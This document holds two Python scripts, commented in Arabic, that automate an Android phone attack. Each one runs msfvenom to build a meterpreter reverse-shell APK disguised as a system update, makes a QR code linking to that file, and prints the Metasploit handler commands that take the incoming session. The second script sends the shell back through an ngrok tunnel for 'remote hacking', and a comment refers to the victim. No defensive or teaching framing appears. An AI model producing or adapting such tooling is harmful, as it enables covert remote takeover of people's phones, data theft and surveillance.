import os
import qrcode

def setup_environment():
    # الأي بي الجديد الخاص بك
    ip = "10.100.84.123" 
    port = "4444"
    filename = "update_service.apk"
    
    print(f"--- [ Using Updated Kali IP: {ip} ] ---")
    
    # 1. إنشاء البيلود (الملف الملغوم)
    print(f"\n[+] Generating Payload: {filename}...")
    cmd_payload = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {filename}"
    os.system(cmd_payload)
    
    # 2. إنشاء الباركود (QR Code)
    print(f"[+] Creating QR Code...")
    link = f"http://{ip}:8000/{filename}"
    qr = qrcode.make(link)
    qr.save("connect.png")
    
    # 3. عرض تعليمات التشغيل الدقيقة
    print("-" * 55)
    print(f"DONE! Scan 'connect.png' with your phone.")
    print("-" * 55)
    print("\n[!] FOLLOW THESE STEPS IN ORDER:")
    print(f"STEP 1: Open a terminal and run the server:")
    print(f"   python3 -m http.server 8000")
    print(f"\nSTEP 2: Open another terminal and run Metasploit:")
    print(f"   msfconsole -q -x \"use exploit/multi/handler; "
          f"set payload android/meterpreter/reverse_tcp; "
          f"set LHOST {ip}; "
          f"set LPORT {port}; "
          f"exploit\"")
    print("-" * 55)
    
    # فتح صورة الباركود
    if os.path.exists("connect.png"):
        os.system("xdg-open connect.png")

if __name__ == "__main__":
    setup_environment()
----------------------------------------------


import os
import qrcode

def setup_ngrok_environment():
    # --- إعدادات Ngrok (يجب تعديلها من شاشة Ngrok عندك) ---
    ngrok_host = "0.tcp.eu.ngrok.io"  # غير هذا للعنوان الذي ظهر لك
    ngrok_port = "12345"             # غير هذا للمنفذ الذي ظهر لك
    
    # أي بي الكالي المحلي (للتحضير فقط)
    local_ip = "10.100.84.123"
    local_port = "4444"
    filename = "system_update.apk"
    
    print(f"--- [ Remote Hacking Setup via Ngrok ] ---")

    # 1. إنشاء البيلود ليعود للـ Ngrok بدلاً من الأي بي المحلي
    # نستخدم LHOST للعنوان الخارجي و LPORT للمنفذ الخارجي
    print(f"\n[+] Generating Payload for Remote Access...")
    cmd_payload = (f"msfvenom -p android/meterpreter/reverse_tcp "
                   f"LHOST={ngrok_host} LPORT={ngrok_port} "
                   f"R > {filename}")
    os.system(cmd_payload)
    
    # 2. إنشاء الباركود
    # ملاحظة: لتحميل الملف عبر الإنترنت، يفضل تشغيل نفق HTTP آخر أو استخدام رابط رفع مباشر
    # هنا سنفترض أنك ستستخدم الأي بي المحلي إذا كان الضحية معك في الشبكة
    # أو يمكنك استخدام رابط Ngrok آخر للسيرفر.
    download_link = f"http://{local_ip}:8000/{filename}"
    
    print(f"[+] Creating QR Code for: {download_link}")
    qr = qrcode.make(download_link)
    qr.save("remote_connect.png")
    
    # 3. التعليمات النهائية
    print("-" * 60)
    print("DONE! Your APK is ready for Global Access.")
    print("-" * 60)
    print("\n[!] TO RECEIVE THE CONNECTION (Terminal 1):")
    print(f"   msfconsole -q -x \"use exploit/multi/handler; "
          f"set payload android/meterpreter/reverse_tcp; "
          f"set LHOST 0.0.0.0; "
          f"set LPORT {local_port}; "
          f"exploit\"")
    print("\n[!] TO SERVE THE FILE (Terminal 2):")
    print(f"   python3 -m http.server 8000")
    print("-" * 60)
    
    os.system("xdg-open remote_connect.png")

if __name__ == "__main__":
    setup_ngrok_environment()
